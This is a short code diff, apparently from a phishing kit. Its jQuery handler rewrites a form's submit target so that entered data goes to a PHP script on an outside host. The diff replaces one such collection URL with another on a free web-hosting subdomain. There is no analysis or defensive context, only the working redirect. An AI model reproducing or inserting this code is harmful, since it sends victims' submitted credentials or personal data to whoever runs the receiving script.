@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://awalyearbagus.my.id/konglomerat/rayooo.php");
+  $(myform).attr("action", "https://come-on-duaribuduaempat.000webhostapp.com/royoan/jobt.php");
 });
